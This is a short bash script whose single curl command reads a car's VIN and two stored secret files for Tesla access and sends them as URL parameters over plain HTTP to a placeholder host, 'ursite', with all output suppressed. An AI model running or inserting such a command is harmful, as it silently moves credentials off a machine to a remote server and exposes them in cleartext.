#!/bin/bash

curl -m 10 'http://ursite/tesla/?car='$(</var/etc/vin)'&s1='$(</var/etc/saccess/tesla1)'&s2='$(</var/etc/saccess/tesla2) >/dev/null 2>&1
